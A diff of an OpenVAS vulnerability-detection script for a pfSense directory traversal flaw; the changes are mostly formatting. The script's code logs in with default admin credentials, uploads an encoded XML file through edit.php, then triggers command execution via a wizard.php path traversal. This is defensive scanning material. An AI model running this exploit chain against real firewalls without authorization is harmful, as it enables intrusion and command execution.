@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_pfsense_wizard_xml_dir_trav_vuln.nasl 7754 2017-11-14 11:15:34Z asteins $
+# $Id: gb_pfsense_wizard_xml_dir_trav_vuln.nasl 11008 2018-08-16 13:26:16Z cfischer $
 #
 # PFSense Wizard XML Directory Traversal Vulnerability
 #
@@ -29,10 +29,10 @@ CPE = 'cpe:/a:pfsense:pfsense';
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.806806");
-  script_version("$Revision: 7754 $");
+  script_version("$Revision: 11008 $");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:C/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2017-11-14 12:15:34 +0100 (Tue, 14 Nov 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-16 15:26:16 +0200 (Thu, 16 Aug 2018) $");
   script_tag(name:"creation_date", value:"2016-01-14 18:46:02 +0530 (Thu, 14 Jan 2016)");
   script_tag(name:"qod_type", value:"remote_vul");
   script_name("PFSense Wizard XML Directory Traversal Vulnerability");
@@ -44,8 +44,10 @@ if(description)
   check whether we can gain command execution.");
 
   script_tag(name:"insight", value:"Multiple flaws are due to,
+
   - wizard.php file do not sanitize the path of the xml parameter
     and we can load xml files
+
   - pkg.php file do not sanitize the path of the xml parameter
     and we can load xml files");
 
@@ -57,12 +59,12 @@ if(description)
 
   script_tag(name:"affected", value:"pfsense 2.2.5 and earlier");
 
-  script_tag(name:"solution", value:"Apply the fix provided by the vendor 
+  script_tag(name:"solution", value:"Apply the fix provided by the vendor
   https://github.com/pfsense/pfsense/commit/3ac0284805ce357552c3ccaeff0a9aadd0c6ea13.");
 
   script_tag(name:"solution_type", value:"VendorFix");
 
-  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2015/Dec/78");
+  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2015/Dec/78");
 
   script_category(ACT_ATTACK);
   script_family("Web application abuses");
@@ -70,14 +72,13 @@ if(description)
   script_dependencies("gb_pfsense_detect.nasl");
   script_require_ports("Services/www", 443);
   script_mandatory_keys("pfsense/http/installed");
+
   exit(0);
 }
 
 include("host_details.inc");
 include("http_func.inc");
 include("http_keepalive.inc");
-
-url = "/index.php";
 
 if(!nmsPort = get_app_port(cpe:CPE, service:"www")){
   exit(0);
@@ -87,10 +88,8 @@ if(!dir = get_app_location(cpe:CPE, port:nmsPort)){
   exit(0);
 }
 
+useragent = get_http_user_agent();
 host = http_host_name(port:nmsPort);
-if(!host){
-  exit(0);
-}
 
 url = dir  + "/index.php";
 req1 = http_get(item:url, port:nmsPort);
@@ -105,16 +104,16 @@ if(res1 && "PHPSESSID" >< res1)
 
   sid = eregmatch( pattern:"sid:([a-zA-Z0-9\,a-zA-Z0-9]+)", string:res1);
   if(sid){
-   fp = split(sid[1], sep:",", keep:0);
+   fp = split(sid[1], sep:",", keep:FALSE);
   }
 
   post_data = '__csrf_magic=sid%3A'+fp[0]+'%2C'+fp[1]+'&usernamefld=admin&passwordfld=pfsense&login=Login';
   len = strlen(post_data);
 
-  req2 =  'POST '+url+' HTTP/1.1\r\n' +
-          'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' + 
-          'Host: '+host+'\r\n' +
-          'Cookie: PHPSESSID='+cookie1[1]+'\r\n' +
+  req2 =  'POST ' + url + ' HTTP/1.1\r\n' +
+          'User-Agent: ' + useragent + '\r\n' +
+          'Host: ' + host + '\r\n' +
+          'Cookie: PHPSESSID=' + cookie1[1] + '\r\n' +
           'Content-Type: application/x-www-form-urlencoded\r\n' +
           'Content-Length: ' + len + '\r\n' +
           '\r\n' +
@@ -130,11 +129,11 @@ if(res1 && "PHPSESSID" >< res1)
     exit(0);
   }
 
-  url = dir + '/edit.php'; 
-  req3 =  'GET ' + url +' HTTP/1.1\r\n' +
-          'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' +
-          'Host: '+host+'\r\n' +
-          'Cookie: PHPSESSID='+cookie2[1]+'\r\n' +
+  url = dir + '/edit.php';
+  req3 =  'GET ' + url + ' HTTP/1.1\r\n' +
+          'User-Agent: ' + useragent + '\r\n' +
+          'Host: ' + host + '\r\n' +
+          'Cookie: PHPSESSID=' + cookie2[1] + '\r\n' +
           '\r\n';
 
   res3 = http_keepalive_send_recv(port:nmsPort, data:req3);
@@ -145,7 +144,7 @@ if(res1 && "PHPSESSID" >< res1)
   if(!sid2[0]){
    exit(0);
   }
-    
+
 
   post_data2 ='__csrf_magic='+sid2[0]+'&action=save&file=/obc.xml&data=PD94bWwg' +
               'dmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiID8%2BCjxwZnNlbnNld2l6YX' +
@@ -158,15 +157,15 @@ if(res1 && "PHPSESSID" >< res1)
             'ZD4=';
   len2=strlen(post_data2);
 
-  url = dir + '/edit.php'; 
+  url = dir + '/edit.php';
   req4 =  'POST ' + url + ' HTTP/1.1\r\n' +
-          'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' +  
-          'Host: '+host+'\r\n' +
+          'User-Agent: ' + useragent + '\r\n' +
+          'Host: ' + host + '\r\n' +
           'Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n' +
           'X-Requested-With: XMLHttpRequest\r\n' +
-          'Referer: https://'+host+'/edit.php\r\n' +
-          'Content-Length: '+len2+'\r\n' +
-          'Cookie: PHPSESSID='+cookie2[1]+'\r\n' +
+          'Referer: https://' + host + '/edit.php\r\n' +
+          'Content-Length: ' + len2 + '\r\n' +
+          'Cookie: PHPSESSID=' + cookie2[1] + '\r\n' +
           '\r\n' +
           post_data2;
 
@@ -180,9 +179,9 @@ if(res1 && "PHPSESSID" >< res1)
     url = dir + '/wizard.php?xml=../../../../../../../obc.xml';
 
     req5 =  'GET ' + url + ' HTTP/1.1\r\n' +
-            'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' + 
-            'Host: '+host+'\r\n' +
-            'Cookie: PHPSESSID='+cookie2[1]+'\r\n' +
+            'User-Agent: ' + useragent + '\r\n' +
+            'Host: ' + host + '\r\n' +
+            'Cookie: PHPSESSID=' + cookie2[1] + '\r\n' +
             'Connection: keep-alive\r\n' +
             '\r\n';
 
@@ -193,11 +192,11 @@ if(res1 && "PHPSESSID" >< res1)
 
 
     ## Empty the content of uploaded file
-    url = dir + '/edit.php'; 
+    url = dir + '/edit.php';
     req6 =  'GET ' + url + ' HTTP/1.1\r\n' +
-            'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' +
-            'Host: '+host+'\r\n' +
-            'Cookie: PHPSESSID='+cookie2[1]+'\r\n' +
+            'User-Agent: ' + useragent + '\r\n' +
+            'Host: ' + host + '\r\n' +
+            'Cookie: PHPSESSID=' + cookie2[1] + '\r\n' +
             '\r\n';
 
     res6 = http_keepalive_send_recv(port:nmsPort, data:req6);
@@ -209,14 +208,14 @@ if(res1 && "PHPSESSID" >< res1)
     len3 = strlen(post_data3);
 
     url = dir + '/edit.php';
-    req7 =  'POST ' + url +' HTTP/1.1\r\n' +
-            'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' +
-            'Host: '+host+'\r\n' +
+    req7 =  'POST ' + url + ' HTTP/1.1\r\n' +
+            'User-Agent: ' + useragent + '\r\n' +
+            'Host: ' + host + '\r\n' +
             'Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n' +
             'X-Requested-With: XMLHttpRequest\r\n' +
-            'Referer: https://'+host+'/edit.php\r\n' +
-            'Content-Length: '+len3+'\r\n' +
-            'Cookie: PHPSESSID='+cookie2[1]+'\r\n' +
+            'Referer: https://' + host + '/edit.php\r\n' +
+            'Content-Length: ' + len3 + '\r\n' +
+            'Cookie: PHPSESSID=' + cookie2[1] + '\r\n' +
             '\r\n' +
             post_data3;
     res7 = http_keepalive_send_recv(port:nmsPort, data:req7);
@@ -224,11 +223,10 @@ if(res1 && "PHPSESSID" >< res1)
       exit(0);
     }
 
-    # confirm vulnerability and also ensure the content emptied from the file
     if(('root' >< res5) && ("File successfully saved" >< res7))
     {
       report = report_vuln_url( port:nmsPort, url:url );
-      report = report + "\r\nPlease remove the ovs.xml file manualy from the application";
+      report = report + "\r\nPlease remove the ovs.xml file manually from the application";
       security_message(port:nmsPort, data:report);
     }
   }
